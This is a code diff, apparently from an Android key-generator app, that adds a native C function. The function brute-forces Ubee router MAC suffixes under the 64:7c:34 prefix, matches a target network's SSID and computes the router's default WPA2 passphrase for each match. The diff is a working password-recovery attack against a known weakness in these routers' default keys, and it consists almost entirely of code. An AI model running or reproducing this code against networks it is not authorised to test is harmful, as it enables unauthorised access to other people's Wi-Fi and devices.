@@ -127,3 +127,85 @@ JNIEXPORT jstring JNICALL Java_net_yolosec_upckeygen_algorithms_UpcKeygen_upcUbe
   ubee_generate_pass((unsigned char *)e_mac, pass, NULL);
   return (*env)->NewStringUTF(env, (char*)pass);
 }
+
+JNIEXPORT void JNICALL Java_net_yolosec_upckeygen_algorithms_UpcKeygen_upcUbeeSsidFind
+        (JNIEnv * env, jobject obj, jbyteArray ess)
+{
+  // Get stopRequested - cancellation flag.
+  jclass cls = (*env)->GetObjectClass(env, obj);
+  jfieldID fid_s = (*env)->GetFieldID(env, cls, "stopRequested", "Z");
+  if (fid_s == NULL) {
+    return; /* exception already thrown */
+  }
+  unsigned char stop = (*env)->GetBooleanField(env, obj, fid_s);
+
+  // Monitoring methods
+  jmethodID on_key_computed = (*env)->GetMethodID(env, cls, "onKeyComputed", "(Ljava/lang/String;Ljava/lang/String;II)V");
+  jmethodID on_progressed = (*env)->GetMethodID(env, cls, "onProgressed", "(D)V");
+  if (on_key_computed == NULL || on_progressed == NULL){
+    return;
+  }
+
+  // ESSID reading from parameter.
+  jbyte *e_native = (*env)->GetByteArrayElements(env, ess, 0);
+  jsize e_ssid_len = (*env)->GetArrayLength(env, ess);
+  char * e_ssid = (char*) e_native;
+
+  IPRINTF("Computing UPC UBEE keys for essid [%.*s]", e_ssid_len, e_ssid);
+  unsigned long stop_ctr = 0;
+  unsigned long iter_ctr = 0;
+  unsigned char mac[] = {0x64, 0x7c, 0x34, 0x0, 0x0, 0x0};
+  unsigned char ssid_cmp[12];
+  unsigned char pass[12] = {0,0,0,0,0,0,0,0,0,0,0,0};
+  char mac_str[20];
+  uint32_t buf[3];
+  int cnt = 0;
+  const long MAX_ITERATIONS_UBEE = 16777216;
+
+  // Compute - from upc_keys.c
+  for (buf[0] = 0; buf[0] <= 0xff; buf[0]++) {
+    for (buf[1] = 0; buf[1] <= 0xff; buf[1]++) {
+      for (buf[2] = 0; buf[2] <= 0xff; buf[2]++) {
+          // Check cancellation signal & progress monitoring.
+          stop_ctr += 1;
+          iter_ctr += 1;
+          if (stop_ctr > (MAX_ITERATIONS_UBEE/2000)){
+            stop_ctr = 0;
+            stop = (*env)->GetBooleanField(env, obj, fid_s);
+            if (stop) {
+              break;
+            }
+
+            double current_progress = (double)iter_ctr / MAX_ITERATIONS_UBEE;
+            (*env)->CallVoidMethod(env, obj, on_progressed, (jdouble)current_progress);
+          }
+
+          mac[3] = buf[0];
+          mac[4] = buf[1];
+          mac[5] = buf[2];
+          ubee_generate_ssid(mac, ssid_cmp, NULL);
+          if ((unsigned)ssid_cmp[3] == (unsigned)e_ssid[3]
+           && (unsigned)ssid_cmp[4] == (unsigned)e_ssid[4]
+           && (unsigned)ssid_cmp[5] == (unsigned)e_ssid[5]
+           && (unsigned)ssid_cmp[6] == (unsigned)e_ssid[6]
+           && (unsigned)ssid_cmp[7] == (unsigned)e_ssid[7]
+           && (unsigned)ssid_cmp[8] == (unsigned)e_ssid[8]
+           && (unsigned)ssid_cmp[9] == (unsigned)e_ssid[9])
+         {
+           cnt++;
+           ubee_generate_pass(mac, pass, NULL);
+           sprintf(mac_str, "64:7c:34:%02x:%02x:%02x", mac[3], mac[4], mac[5]);
+
+           IPRINTF("  -> #%02d WPA2 UBEE phrase for SSID '%.*s' pass '%s', mac %s",
+             cnt, e_ssid_len, e_ssid, pass, mac_str);
+
+           jstring jpass = (*env)->NewStringUTF(env, pass);
+           jstring jmac = (*env)->NewStringUTF(env, mac_str);
+           (*env)->CallVoidMethod(env, obj, on_key_computed, jpass, jmac, (jint)0, (jint)0);
+           (*env)->DeleteLocalRef(env, jpass);
+           (*env)->DeleteLocalRef(env, jmac);
+         }
+      }
+    }
+  }
+}
